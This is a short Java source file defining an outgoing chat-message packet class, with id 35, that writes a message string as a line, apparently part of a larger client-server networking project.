package com.redpois0n.packets.outgoing;

import java.io.DataOutputStream;

import com.redpois0n.common.io.StringWriter;

public class Packet35ChatMessage extends AbstractOutgoingPacket {
	
	private String message;
	
	public Packet35ChatMessage(String message) {
		this.message = message;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(this.message);
	}

	@Override
	public byte getPacketId() {
		return 35;
	}

}
